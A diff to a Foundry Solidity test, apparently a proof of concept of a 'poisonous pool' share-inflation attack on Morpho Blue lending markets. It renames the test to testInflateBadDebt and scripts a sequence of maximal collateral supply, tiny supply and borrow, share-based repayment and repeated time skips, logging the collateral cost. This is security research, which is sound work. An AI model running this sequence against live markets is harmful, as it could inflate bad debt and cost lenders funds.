@@ -8,6 +8,7 @@ pragma solidity ^0.8.0;
 import "../lib/morpho-blue/test/forge/BaseTest.sol";
 
 contract PoisonousPoolIntegrationTest is BaseTest {
+    using MathLib for uint256;
     using SharesMathLib for uint256;
     using MarketParamsLib for MarketParams;
     using MorphoLib for IMorpho;
@@ -28,13 +29,22 @@ contract PoisonousPoolIntegrationTest is BaseTest {
         );
     }
 
-    function testPoison() public {
-        collateralToken.setBalance(address(this), 1e18);
-        loanToken.setBalance(address(this), 1);
+    function testInflateBadDebt() public {
+        uint256 initialSupply = 0;
 
-        morpho.supplyCollateral(marketParams, 1e18, address(this), hex"");
-        morpho.supply(marketParams, 1, 0, address(this), hex"");
-        morpho.borrow(marketParams, 1, 0, address(this), address(this));
+        if (initialSupply > 0) {
+            loanToken.setBalance(address(this), initialSupply);
+            morpho.supply(marketParams, initialSupply, 0, ONBEHALF, hex"");
+        }
+
+        uint256 supplied = initialSupply * 100 + 1;
+
+        collateralToken.setBalance(address(this), type(uint128).max);
+        morpho.supplyCollateral(marketParams, type(uint128).max, address(this), hex"");
+
+        loanToken.setBalance(address(this), supplied);
+        morpho.supply(marketParams, supplied, 0, address(this), hex"");
+        morpho.borrow(marketParams, supplied, 0, address(this), address(this));
 
         Market memory market = morpho.market(marketParams.id());
         console2.log(
@@ -54,11 +64,14 @@ contract PoisonousPoolIntegrationTest is BaseTest {
                 - SharesMathLib.VIRTUAL_ASSETS
         );
 
-        uint256 borrowed = uint256(1e6).toAssetsUp(market.totalBorrowAssets, market.totalBorrowShares);
-        loanToken.setBalance(address(this), borrowed);
+        uint256 borrowed =
+            (supplied * SharesMathLib.VIRTUAL_SHARES).toAssetsUp(market.totalBorrowAssets, market.totalBorrowShares);
 
-        morpho.repay(marketParams, 0, 1e6, address(this), hex"");
-        morpho.withdrawCollateral(marketParams, 1e18, address(this), address(this));
+        console2.log("collateral cost: %e", borrowed.wDivDown(marketParams.lltv));
+
+        loanToken.setBalance(address(this), borrowed);
+        morpho.repay(marketParams, 0, supplied * SharesMathLib.VIRTUAL_SHARES, address(this), hex"");
+        morpho.withdrawCollateral(marketParams, type(uint128).max, address(this), address(this));
 
         for (uint256 i; i < 13; ++i) {
             skip(5 days);
